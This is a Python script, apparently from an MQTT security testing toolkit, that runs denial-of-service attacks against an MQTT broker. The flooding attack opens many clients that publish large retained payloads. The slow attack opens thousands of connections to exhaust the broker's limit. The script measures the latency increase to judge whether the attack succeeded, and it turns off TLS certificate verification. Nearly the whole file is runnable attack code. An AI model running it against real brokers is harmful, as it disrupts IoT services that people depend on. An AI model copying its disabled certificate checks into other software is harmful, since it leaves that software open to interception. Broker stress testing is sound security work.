import ssl, time
import paho.mqtt.client as mqtt
from statistics import mean
import argparse

# To stay consitent with Sniffing attack
class Credentials:
    def __init__(self):
        # boolean flag used to check if the object is empty or not
        self.empty = True
        self.clientID = None
        self.username = None
        self.password = None

    def add_clientID(self, clientID):
        self.empty = False
        self.clientID = clientID
    def add_username(self, username):
        self.empty = False
        self.username = username
    def add_password(self, password):
        self.empty = False
        self.password = password
        
connected = 0

connection_difference = 0
percentage_increment = 0
slow_connection_difference = 0

publish_times = []

def on_connect(client, userdata, flags, rc):
    global connected
    if (rc == 0):
        connected +=1

def on_publish(client, userdata, mid):
    global publish_times
    publish_times.append( (time.time() * 1000) - client.pre_publish)

def get_avg_publish_time(host, port, topic, credentials, cert_key_paths):
    global publish_times
    
    # Init the client that will record publish delays - no on_connect
    # Set clientID, username, password or certificates as required
    if(not credentials.empty):
        if (credentials.clientID != None):
            client = mqtt.Client(credentials.clientID, clean_session=True)
        else:
            client = mqtt.Client(client_id="Time_publisher", clean_session=True)
        client.username_pw_set(credentials.username, credentials.password)
    else:
        client = mqtt.Client(clean_session=True)
        
    if(cert_key_paths[0]!=None):
        client.tls_set(cert_key_paths[0], cert_key_paths[1], cert_key_paths[2], ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
        client.tls_insecure_set(True)   

    try:
        client.on_publish = on_publish
        client.connect(host, port, 60)
        client.loop_start()

        # Wait for connection to complete
        while(not client.is_connected()):
            time.sleep(1)
        
        # Set pre-publish timestamps to compare them with on_publish ones
        for x in range (100):
            #time.sleep(.1)
            client.pre_publish = time.time() * 1000
            client.publish(topic,"DoSMessage"+str(x+1), qos=1)
    
        print("Waiting for all publish acknowledgment (press ctrl+c once to skip):")
        # Wait for all ack to arrive or 30s timeout
        for x in range (30):
            if(len(publish_times) == 100):
                print("All acknowledgment received")
                break
            else:
                if (x % 10 == 0):
                    print(str(30-x) + " seconds remaining") # print each 10s
                time.sleep(1)
    except KeyboardInterrupt:
        print("Skipping the function to get average publish time")
        pass
    except:
        print("Error while connecting and evaluating average publish time")
        pass

    # Does not raise exceptions if does not manage to connect
    client.loop_stop() 
    client.disconnect()
 
def flooding_dos(host, port, credentials, cert_key_paths, connections, payload_size, topic, wait_time):
    global connected
    global connection_difference
    global percentage_increment
    global publish_times
    connected = 0 # reset the connected counter
    mqtt_clients = [] #An array containing all clients for publishing
        
    #Send 100 messages and store the time between sending a QoS 1 message and receiving the acknowledgment
    get_avg_publish_time(host, port, topic, credentials, cert_key_paths)
    pre_test_measures = mean(publish_times) if (publish_times) else 0
    publish_times = [] # Clean the list

    #Init and connect all clients - no on_publish
    for x in range(connections):
        
        # Use different Client_IDs
        client = mqtt.Client(client_id="Client_flooding_"+str(x), clean_session=True)
        client.on_connect = on_connect
        
        if (not credentials.empty):
            client.username_pw_set(credentials.username, credentials.password)
        if(cert_key_paths[0]!=None):
            client.tls_set(cert_key_paths[0], cert_key_paths[1], cert_key_paths[2], ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
            client.tls_insecure_set(True) #allow to test scenarios with self-signed certificates
        
        try:
            client.connect(host, port, wait_time)
            client.loop_start()
            mqtt_clients.append(client)
        except:
            print("Error while connecing flooding clients")
            pass
    
    #Wait for all clients connections or X seconds timeout
    try:
        print(str(wait_time) + " seconds timeout for flooding-based DoS (press ctrl+c once to skip):")
        for x in range (wait_time):
            if(int(connections)-connected == 0):
                print("All flooding DoS clients connected")
                break;
            else:
                if (x % 10 == 0):
                    print(str(wait_time-x) + " seconds remaining") # print each 10s
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    #payload_size (MB)
    payload = "0" * 1024 * 512 * payload_size
    
    print("Starting flooding-based DoS publishing - "+ str(payload_size) +" MB")
    for client in mqtt_clients:
        client.publish(topic+"/"+client._client_id.decode(),payload,0,True) #Set retain to True to possibly affect also I/O

    #Send 100 messages and store the time between sending a QoS 1 message and receiving the acknowledgment
    get_avg_publish_time(host, port, topic, credentials, cert_key_paths)
    post_test_measures =  mean(publish_times) if (publish_times) else 0
    publish_times = []

    for client in mqtt_clients:
        client.publish(topic+"/"+client._client_id.decode(),"",0,True) #Clean from retained messages
        #client.loop_stop() #Commented out to save time (not really necessary)
        #client.disconnect()
        
    connection_difference = (connections-connected)
    
    if(pre_test_measures != 0 and post_test_measures != 0):
        percentage_increment = ((post_test_measures - pre_test_measures)/pre_test_measures)*100
        print("Flooding DoS - pre-sending time: " + str(int(pre_test_measures))+"ms")
        print("Flooding DoS - post-sending time: " + str(int(post_test_measures))+"ms")
        print("Flooding DoS - Time_increment: " + str(int(percentage_increment))+"%")

    #If not all clients managed to connect or there is an increment in publish time of more than 100% DoS is succesfull
    if (connection_difference != 0 or percentage_increment > 100):
        print("Flooding DoS - Connection difference: " + str(connection_difference))
        return True
    else:
        return False

def slow_dos(host, port, credentials, cert_key_paths, max_connections, wait_time):
    global connected
    global slow_connection_difference
    connected = 0 # reset the connected counter
    #mqtt_clients = [] #Used to disconnect clients
    
    try:
        for x in range(max_connections):
            client = mqtt.Client(client_id="Client_slow_"+str(x), clean_session=True)
            client.on_connect = on_connect
            
            if (not credentials.empty):
                client.username_pw_set(credentials.username, credentials.password)
            if(cert_key_paths[0]!=None):
                client.tls_set(cert_key_paths[0], cert_key_paths[1], cert_key_paths[2], ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
                client.tls_insecure_set(True) #allow to test scenarios with self-signed certificates

            client.connect_async(host, port, wait_time)
            client.loop_start()
            #mqtt_clients.append(client)
            #time.sleep(.1) #Avoids socket error with many connections (e.g., over 8k)
    except:
        pass

    #Wait for all clients connections or X seconds timeout
    try:
        print(str(wait_time//60) +" minutes timeout for slow DoS (press ctrl+c once to skip):")
        for x in range (wait_time):
            if(max_connections-connected == 0):
                print("All "+str(max_connections)+" connections succeeded")
                break;
            else:
                if (x % 60 == 0):
                    print(str((wait_time-x)//60) + " minutes remaining")
                time.sleep(1)
    except KeyboardInterrupt:
        pass

    #Disconnect all clients #Commented out to save time (not really necessary)
    #for client in mqtt_clients:
    #    client.loop_stop()
    #    client.disconnect()

    slow_connection_difference = max_connections-connected
           
    #If not all clients managed to connect DoS is succesfull
    if (connected > 0 and slow_connection_difference != 0):
        print("Slow DoS succesfull, max connections allowed: "+ str(connected))
        return True
    else:
        return False

def broker_dos(host, port, credentials, connections, payload_size, slow_connections, topic, cert_key_paths):
    
    res1 = False
    res2 = False
    
    if (not credentials.empty):
        print ("DoS client credentials:\n - ID: " + credentials.clientID + " U: "+ credentials.username + " P: "+ credentials.password)

    if(connections!=None):
        res1 = flooding_dos(host, port, credentials, cert_key_paths, connections, payload_size, topic, 60)
        
    if(slow_connections!=None):
        #For the TTL/wait time, we consider 3k connections each minute as reference (and double the time); at least 60s
        time = (int(slow_connections*0.04)) if (slow_connections*0.04 > 60) else 60
        res2 = slow_dos(host, port, credentials, cert_key_paths, slow_connections, time)

    return (res1 or res2)

# used for testing purposes
if __name__ == "__main__":

    # parse args
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument(metavar='*broker_address*', type=str, dest='broker_address', help='Specify the broker IP address or hostname')
    parser.add_argument('-p', type=int, dest='port', default=1883, help='broker port (def. 1883)')

    parser.add_argument('--topic', type=str, default='DoS_Topic', help='Topic (def. "DoS_Topic")')

    parser.add_argument('-fc', dest='dos_fooding_conn', type=int, default=10, help='Specify the amount of connections for the flooding-based DoS (defaults to 10)')
    parser.add_argument('-fcsize', dest='dos_size', type=int, default = 10, help='Specify the payload size in MB for the flooding-based DoS (defaults to 10)')
    parser.add_argument('-sc', dest='dos_slow_conn', type=int, default = 2000, help='Specify the max amount of connections for the slow DoS (defaults to 2000)')

    parser.add_argument('-id', dest = 'clientID', type=str, default=None, help='client ID')
    parser.add_argument('-usr', dest = 'username', type=str, default=None, help='client username')
    parser.add_argument('-pwd', dest = 'password', type=str, default=None, help='client password')

    parser.add_argument('-ca', dest = 'ca_cert_path', type=str, default=None, help='CA certificate path')  
    parser.add_argument('-cert', dest = 'client_cert_path', type=str, default=None, help='Client certificate path')
    parser.add_argument('-key', dest = 'client_key_path', type=str, default=None, help='Client key path')   

    args = parser.parse_args()

    credentials = Credentials()
    
    if(args.clientID != None):
        credentials.add_clientID(args.clientID)        
    if(args.username != None and args.password != None):
        credentials.add_username(args.username)
        credentials.add_password(args.password)

    if args.dos_fooding_conn == None or args.dos_fooding_conn < 1:
        print('[!] "dos_fooding_conn" parameter < 1 or not specified, no flooding-based DoS attack')
        args.dos_fooding_conn = None
    if args.dos_slow_conn == None or args.dos_slow_conn < 1:
        print('[!] "dos_slow_conn" parameter < 1 or not specified, no slow-DoS attack')
        args.dos_slow_conn = None

    print("DoS test completed. Result: " + str(
        broker_dos(args.broker_address, args.port, 
        credentials, 
        args.dos_fooding_conn, args.dos_size, args.dos_slow_conn,
        args.topic,         
        [args.ca_cert_path, args.client_cert_path, args.client_key_path])
        ))